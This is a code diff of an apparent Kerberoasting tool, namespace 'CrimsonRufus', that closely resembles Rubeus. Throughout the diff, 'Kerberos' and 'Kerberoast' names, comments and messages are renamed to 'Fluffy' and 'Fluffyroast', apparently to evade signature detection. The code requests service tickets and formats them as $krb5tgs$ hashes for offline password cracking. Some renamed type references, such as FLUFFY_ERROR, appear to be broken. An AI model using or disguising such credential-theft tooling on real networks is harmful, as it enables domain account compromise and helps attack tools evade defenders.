@@ -288,7 +288,7 @@ namespace CrimsonRufus
             {
                 // parse the response to an KRB-ERROR
                 KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
-                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.FLUFFY_ERROR)error.error_code);
             }
             else
             {
@@ -296,7 +296,7 @@ namespace CrimsonRufus
             }
         }
 
-        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false, string nopreauth = null)
+        public static void Fluffyroast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false, string nopreauth = null)
         {
             if (userStats)
             {
@@ -356,7 +356,7 @@ namespace CrimsonRufus
                 }
                 else
                 {
-                    // otherwise use the KerberosRequestorSecurityToken method
+                    // otherwise use the FluffyRequestorSecurityToken method
                     GetTGSRepHash(spn, "USER", "DISTINGUISHEDNAME", cred, outFile);
                 }
             }
@@ -379,7 +379,7 @@ namespace CrimsonRufus
                     }
                     else
                     {
-                        // otherwise use the KerberosRequestorSecurityToken method
+                        // otherwise use the FluffyRequestorSecurityToken method
                         GetTGSRepHash(s, "USER", "DISTINGUISHEDNAME", cred, outFile);
                     }
                 }
@@ -553,11 +553,11 @@ namespace CrimsonRufus
                 {
                     if (users.Count == 0)
                     {
-                        Console.WriteLine("\r\n[X] Keine Benutzer zum Kerberoasten gefunden!");
+                        Console.WriteLine("\r\n[X] Keine Benutzer zum Fluffyroasten gefunden!");
                     }
                     else
                     {
-                        Console.WriteLine("\r\n[] Kerberoastbare Benutzer gesamt: {0}\r\n", users.Count);
+                        Console.WriteLine("\r\n[] Fluffyroastbare Benutzer gesamt: {0}\r\n", users.Count);
                     }
 
                     // used to keep track of user encryption types
@@ -655,7 +655,7 @@ namespace CrimsonRufus
                             }
                             else
                             {
-                                // otherwise use the KerberosRequestorSecurityToken method
+                                // otherwise use the FluffyRequestorSecurityToken method
                                 bool result = GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
                                 Helpers.RandomDelayWithJitter(delay, jitter);
                                 if (!result && autoenterprise)
@@ -704,7 +704,7 @@ namespace CrimsonRufus
 
         public static bool GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false)
         {
-            // use the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach
+            // use the System.IdentityModel.Tokens.FluffyRequestorSecurityToken approach
 
             string domain = "DOMAIN";
 
@@ -842,7 +842,7 @@ namespace CrimsonRufus
 
         public static bool GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
         {
-            // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
+            // use a TGT blob to request a hash instead of the FluffyRequestorSecurityToken method
             string tgtDomain = "DOMAIN";
 
             // we can only roast tickets for the domain that we have a TGT for, first determine it's a TGT
@@ -940,9 +940,9 @@ namespace CrimsonRufus
             return false;
         }
 
-        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false, string desPlainText = "")
+        public static void DisplayTGShash(KRB_CRED cred, bool fluffyroastDisplay = false, string fluffyroastUser = "USER", string fluffyroastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false, string desPlainText = "")
         {
-            // output the hash of the encrypted KERB-CRED service ticket in a kerberoast hash form
+            // output the hash of the encrypted KERB-CRED service ticket in a fluffyroast hash form
 
             int encType = cred.tickets[0].enc_part.etype;
             string userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
@@ -957,7 +957,7 @@ namespace CrimsonRufus
             {
                 int checksumStart = cipherText.Length - 24;
                 //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.            
-                hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
+                hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, fluffyroastUser, fluffyroastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
             }
             else if (encType == 3 && !string.IsNullOrWhiteSpace(desPlainText))
             {
@@ -966,7 +966,7 @@ namespace CrimsonRufus
             //if encType==23
             else
             {
-                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
+                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, fluffyroastUser, fluffyroastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
             }
 
             if (!String.IsNullOrEmpty(outFile))
@@ -995,18 +995,18 @@ namespace CrimsonRufus
                     {
                         if (!header)
                         {
-                            if (kerberoastDisplay)
+                            if (fluffyroastDisplay)
                             {
                                 Console.WriteLine("[*] Hash                   : {0}", line);
                             }
                             else
                             {
-                                Console.WriteLine("  Kerberoast Hash          :  {0}", line);
+                                Console.WriteLine("  Fluffyroast Hash          :  {0}", line);
                             }
                         }
                         else
                         {
-                            if (kerberoastDisplay)
+                            if (fluffyroastDisplay)
                             {
                                 Console.WriteLine("                             {0}", line);
                             }
@@ -1020,13 +1020,13 @@ namespace CrimsonRufus
                 }
                 else
                 {
-                    if (kerberoastDisplay)
+                    if (fluffyroastDisplay)
                     {
                         Console.WriteLine("[*] Hash                   : {0}", hash);
                     }
                     else
                     {
-                        Console.WriteLine("  Kerberoast Hash          :  {0}", hash);
+                        Console.WriteLine("  Fluffyroast Hash          :  {0}", hash);
                     }
                 }
             }
